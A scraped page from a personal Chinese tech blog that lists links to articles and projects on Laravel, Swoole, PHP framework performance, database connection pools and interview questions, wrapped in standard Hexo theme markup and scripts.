<p><a href="https://laravel-china.org/articles/20281#2020e7" target="_blank" rel="noopener">开源了一个小小的商城</a></p>
<p><a href="https://github.com/lawoole/lawoole" target="_blank" rel="noopener">Laravel 和 Swoole 的高性能框架</a></p>
<p><a href="https://laravel-china.org/articles/21358" target="_blank" rel="noopener">基于 swoole 的高性能 PHP 框架</a></p>
<p><a href="https://laravel-china.org/articles/18801" target="_blank" rel="noopener"> Laravel 应用中的 Swoole 集成</a></p>
<p><a href="https://github.com/walkor/workerman-chat" target="_blank" rel="noopener">聊天室系统</a></p>
<p><a href="https://laravel-china.org/topics/17351" target="_blank" rel="noopener">不用三方包 给 Laravel 开启 Swoole</a></p>
<p><a href="https://laravel-china.org/topics/20181" target="_blank" rel="noopener">基于 Laravel-swoole 开发部署的在线聊天室</a></p>
<p><a href="https://github.com/blankqwq/stu_x" target="_blank" rel="noopener">一个线上提交作业的平台</a></p>
<p><a href="https://github.com/louislivi/SMProxy" target="_blank" rel="noopener">使用数据库连接池提高性能</a></p>
<p><a href="https://github.com/swooletw/laravel-swoole/wiki/4.-Installation" target="_blank" rel="noopener">laravel swoole</a></p>
<p><a href="https://www.v2ex.com/t/371855" target="_blank" rel="noopener">为什么我不太想用 Laravel </a></p>
<p><a href="https://www.v2ex.com/t/441162" target="_blank" rel="noopener"> laravel 寫 APP 接口</a></p>
<p><a href="https://github.com/qianhuihuiji/notebook" target="_blank" rel="noopener">laracast 视频教程系列笔记</a></p>
<p><a href="https://laravel-china.org/articles/19737" target="_blank" rel="noopener">我独自走进 Laravel5.5 的❤（八）</a></p>
<p><a href="https://www.v2ex.com/t/478257" target="_blank" rel="noopener">Laravel面试</a></p>
<p><a href="https://learnku.com/articles/20793#topnav" target="_blank" rel="noopener">Laravel，PHP 如何使用数据库连接池提高性能</a></p>
<p><a href="https://laravel-china.org/articles/18062" target="_blank" rel="noopener">Swoole 源码分析</a></p>
<p><a href="https://lvwenhan.com/laravel/432.html" target="_blank" rel="noopener">Laravel 5 系列入门教程</a></p>
<p><a href="https://lax.v2ex.com/t/420124" target="_blank" rel="noopener">Laravel 到底能慢到什么程度</a></p>
<p><a href="https://laravel-china.org/articles/18123" target="_blank" rel="noopener">使用 laragon 的 ngrok 功能在本地开发微信公众号</a></p>
<p><a href="https://github.com/kenjis/php-framework-benchmark/blob/master/README.md" target="_blank" rel="noopener">php框架压测</a></p>
<p><a href="https://www.v2ex.com/t/272328?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io" target="_blank" rel="noopener">Laravel 每个控制器都需要写个路由</a></p>
<p><a href="http://www.dahouduan.com/2018/03/18/laravel-speed-up/" target="_blank" rel="noopener">Laravel 项目加速指南</a></p>
<p><a href="https://github.com/rlerdorf/opcache-status" target="_blank" rel="noopener">opcache 的统计功能</a></p>
<p><a href="https://learnku.com/articles/34475" target="_blank" rel="noopener">基于 Swoole 开发的 MySQL 数据库连接池SMProxy </a></p>
<p><a href="https://www.v2ex.com/t/398902" target="_blank" rel="noopener">laravel 优化</a></p>
<p><a href="https://lax.v2ex.com/t/357983?p=1" target="_blank" rel="noopener">国内使用 laravel </a></p>
<p><a href="https://github.com/phwoolcon/phwoolcon/blob/master/README-zh.md" target="_blank" rel="noopener">phwoolcon</a></p>
<p><a href="https://github.com/ydtg1993/admin" target="_blank" rel="noopener">laravel和Uikit开发的后台管理系统雏形 自带完整oauth授权管理模块</a></p>
<p><a href="https://laravel-china.org/articles/20450?#reply77440" target="_blank" rel="noopener">Laravel HTML 导出 PDF 方案 -</a></p>
<p><a href="https://laravel-china.org/articles/21048" target="_blank" rel="noopener">《2018年小米高级 PHP 工程师面试题（模拟考试卷）》答案解析 [ 未指定版本 ]</a></p>
<p><a href="https://laravel-china.org/articles/21985?#reply77444" target="_blank" rel="noopener">laravel Facades 原理 (代码执行流程分析)</a></p>
<p><a href="http://mysql.taobao.org/monthly/2017/11/09/" target="_blank" rel="noopener">MySQL · 最佳实践 · 分区表基本类型</a></p>
<p><a href="https://laravel-china.org/articles/21993" target="_blank" rel="noopener">《2019年小米春季上海 PHP 实习生招聘面试题》部分答案解析 [ 千人千面 ]</a></p>
<p><a href="https://laravel-china.org/docs/the-laravel-way/5.6" target="_blank" rel="noopener">Laravel 之道</a></p>
<p><a href="https://github.com/woann/chat" target="_blank" rel="noopener">基于 laravelS 和 layim 的聊天系统</a></p>
<p><a href="https://laravel-china.org/articles/20714" target="_blank" rel="noopener">PHP 高级工程面试题汇总</a></p>
<p><a href="https://github.com/xiaohuilam/laravel/wiki" target="_blank" rel="noopener">Laravel 深入浅出指南</a></p>
<p><a href="https://laravel-china.org/articles/21979" target="_blank" rel="noopener">基于 swoole 协程的 MySQL 连接池</a></p>
<p><a href="https://laravel-china.org/articles/21966" target="_blank" rel="noopener">swoole 加速 Lumen5.7 Restful API 接口</a></p>
<p><a href="https://github.com/SakyaVarro/laracasts-translation" target="_blank" rel="noopener">Laracasts 系列教程</a></p>
<p><a href="https://github.com/kevinyan815/Learning_Laravel_Kernel" target="_blank" rel="noopener">Laravel核心代码学习</a></p>
<p><a href="https://laravel-china.org/articles/19427" target="_blank" rel="noopener">laravel5.5 支付—— 支付宝</a></p>
<p><a href="http://doc2.workerman.net/" target="_blank" rel="noopener">GatewayWorker 手册</a></p>
<p><a href="https://github.com/cxp1539/laravel-core-learn" target="_blank" rel="noopener">Laravel 深入核心系列教程</a></p>
<p><a href="https://www.v2ex.com/t/401168" target="_blank" rel="noopener">PHP 框架性能测试比较</a></p>
<p><a href="https://www.v2ex.com/t/428497" target="_blank" rel="noopener">Swoole 加速 Laravel/Lumen</a></p>
<p><a href="https://doc.swoft.org/master/zh-CN/quickstart/install.html" target="_blank" rel="noopener">swoft</a></p>
<p><a href="https://learnku.com/articles/23935" target="_blank" rel="noopener">Laravel 源码阅读指南</a></p>
<p><a href="https://learnku.com/articles/22094" target="_blank" rel="noopener">基于 laravelS 和 layim 的聊天系统</a></p>
<p><a href="https://github.com/hhxsv5/laravel-s/blob/master/README-CN.md" target="_blank" rel="noopener">快速集成Swoole到Laravel lumen</a></p>
<p><a href="https://laravel-china.org/articles/20816" target="_blank" rel="noopener">Laravel 源码阅读之一：Composer 自动加载分析</a></p>
<p><a href="https://github.com/zhuqipeng/alfred-workflow" target="_blank" rel="noopener">Laravel 中文文档检索 Alfred Workflow</a></p>
<p><a href="https://learnku.com/articles/24742#topnav" target="_blank" rel="noopener">基于 Laravel 框架开发的基础权限后台系统</a></p>
<p><a href="https://learnku.com/articles/25179" target="_blank" rel="noopener">Laravel 下 Elasticsearch 使用</a></p>
<p><a href="https://larecipe.binarytorch.com.my/docs/1.3/installation" target="_blank" rel="noopener">markdown文档</a></p>
<p><a href="https://learnku.com/articles/20539" target="_blank" rel="noopener">基于 Laravel 框架的 rbac 后台管理系统</a></p>
<p><a href="http://www.luckybird.me/laravel5%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E5%92%8C%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">Laravel5配置读写分离和源码分析</a></p>
<p><a href="https://github.com/shisiying/webim" target="_blank" rel="noopener">Laravel-swoole 开发部署的在线聊天室</a></p>
<p><a href="https://learnku.com/articles/28607" target="_blank" rel="noopener">PHP 与 Swoole 浅析与学习</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">苏生不惑</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">281</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sushengbuhuo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mysusheng@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/mysusheng" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://v2ex.com/" title="v2ex" target="_blank">v2ex</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.fanhaobai.com/" title="fanhaobai" target="_blank">fanhaobai</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="yuanxuxu" target="_blank">yuanxuxu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.snail-c.cn/article" title="snail-c" target="_blank">snail-c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://showcj.com/archives" title="showcj" target="_blank">showcj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vultr.aicnm.com/%E6%9C%80%E6%96%B0Vultr%E6%B3%A8%E5%86%8C%E5%8F%8AVPS%E8%B4%AD%E4%B9%B0%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B/" title="vultr" target="_blank">vultr</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lucissfer.com/" title="lucissfer" target="_blank">lucissfer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/fdipzone/article/details/79352685" title="傲雪星枫" target="_blank">傲雪星枫</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yoby123.cn/index.php/category/default/" title="小白的分享" target="_blank">小白的分享</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/p/5819995.html" title="PHP攻城狮" target="_blank">PHP攻城狮</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.jiaojie.site/" title="php" target="_blank">php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sphard.com/archives/" title="sphard" target="_blank">sphard</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="LNMP技术栈笔记" target="_blank">LNMP技术栈笔记</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.coding10.com/" title="学习 Laravel" target="_blank">学习 Laravel</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shuwoom.com/?page_id=929" title="区块链学习指南" target="_blank">区块链学习指南</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greenlightt.github.io/archives/" title="greenlightt" target="_blank">greenlightt</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.0php.net/archives/" title="0php" target="_blank">0php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.fordba.com/category/mysql" title="mysql" target="_blank">mysql</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.itcodemonkey.com/" title="程序员" target="_blank">程序员</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yanshuo.me/r/v2ex" title="言说" target="_blank">言说</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.timiguo.com/archive.html" title="提米果的博客" target="_blank">提米果的博客</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://phpartisan.cn/news/112.html" title="phpartisan" target="_blank">phpartisan</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/" title="飞鸿影" target="_blank">飞鸿影</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.54php.cn/" title="54php" target="_blank">54php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lazyman.vip/" title="营销" target="_blank">营销</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.njphper.com/archives/" title="做人呢最重要的就是开心" target="_blank">做人呢最重要的就是开心</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.h57.pw/" title="php 初心者" target="_blank">php 初心者</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">苏生不惑</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<div>
<span id="showDays"></span>

</div>

<span id="busuanzi_container_site_pv">
   总访问量:<span id="busuanzi_value_site_pv"></span>次
</span>



  <span class="post-meta-divider">|</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共680.1k字</span>
</div>
<script>
var birthDay = new Date("11/20/2018");
var now = new Date();
var duration = now.getTime() - birthDay.getTime();
var total= Math.floor(duration / (1000 * 60 * 60 * 24));
document.getElementById("showDays").innerHTML = "本站已运行 "+total+" 天";
</script>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  











<script type="text/javascript">
    (function() {
        // 匿名函数，防止污染全局变量
        var utterances = document.createElement('script');
        utterances.type = 'text/javascript';
        utterances.async = true;
        utterances.setAttribute('issue-term','0')
        utterances.setAttribute('theme','')
        utterances.setAttribute('repo','sushengbuhuo/laravel_ioc_demo')
        utterances.crossorigin = 'anonymous';
        utterances.src = 'https://utteranc.es/client.js';
        // content 是要插入评论的地方
        document.getElementById('gitment-container').appendChild(utterances);
    })();
</script>


  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

  
<script>
  ((window.gitter = {}).chat = {}).options = {
    //room替换成自己的聊天室名称即可，room的名称规则是：username/roomname
    room: 'sushengbuhuo-chat/mychat'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

</body>
</html>
